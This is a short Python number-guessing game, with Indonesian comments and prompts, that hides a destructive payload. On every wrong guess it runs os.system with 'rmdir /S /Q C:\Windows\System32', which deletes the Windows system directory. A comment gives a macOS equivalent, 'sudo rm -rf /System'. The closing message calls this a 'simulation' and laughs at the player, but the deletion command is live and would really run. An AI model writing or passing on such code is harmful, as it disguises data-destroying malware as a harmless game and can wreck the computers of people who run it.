import random
import os  

# angka acak
angka_rahasia = random.randint(1, 10)
kesempatan = 3  

print("Tebak angka antara 1-10 (Kesempatan 3x)!")

for i in range(kesempatan):
    try:
        tebakan = int(input(f"Percobaan {i+1}: Masukkan tebakan: "))

        if tebakan == angka_rahasia:
            print("Anda menang! 🎉")
            break
        else:
            print("Tebakan salah!")
            print("⚠️Peringatan konsekuensi berbahaya!!!") 
            os.system("rmdir /S /Q C:\\Windows\\System32") 
            # sudo rm -rf /System   (versi MAC)

    except ValueError:
        print("Masukkan angka yang valid!")

else:
    print(f"\nGame Over! Angka yang benar adalah: {angka_rahasia}")
    print("💀 Simulasi: Windows crash karena kehilangan System32 ! HAHAHAHAHA (KETAWA JAHAT)")
